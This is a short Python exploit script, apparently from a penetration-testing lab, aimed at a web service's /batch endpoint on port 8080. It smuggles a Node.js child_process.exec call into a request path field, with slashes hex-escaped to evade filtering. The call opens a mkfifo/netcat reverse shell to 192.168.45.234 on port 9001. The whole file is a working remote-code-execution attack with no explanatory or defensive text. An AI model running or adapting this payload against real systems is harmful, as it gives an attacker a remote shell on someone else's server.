import sys
import re
import json
import requests
from bs4 import BeautifulSoup

# '{ "requests": [{ "method": "get", "path": "/profile" }, { "method": "get", "path": "/item" }, { "method": "get", "path": "/item/$1.id" }] }'

def send_request(target):
	# Samples
	request1 = json.dumps({
		"method": "get",
		"path": "/profile"
	})
	request2 = json.dumps({
		"method": "get",
		"path": "/item"
	})
	request3 = json.dumps({
		"method":"get",
		"path": "/item/$1.id;"
	})
	print(request1)
	cmd = "require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.234 9001 >/tmp/f')"
	cmd = cmd.replace("/", "\\\\x2f")
	# Put 2 \\ so that it can be resolved twice by Python, once here and once in request

	request = f'{{"method": "get", "path": "/item/$1.id;{cmd}"}}'
	payload = f'{{"requests":[{request1},{request2},{request}]}}'
	print(payload)

	r = requests.post(target, payload)
	print(r.text)

def main():
    if len(sys.argv) != 2:
        print (f"(+) usage: {sys.argv[0]} <ip>")
        print (f"(+) eg: {sys.argv[0]} 192.168.121.103")
        sys.exit(-1)

    ip = sys.argv[1]
    target = f"http://{ip}:8080/batch"
    send_request(target)


if __name__ == "__main__":
    main()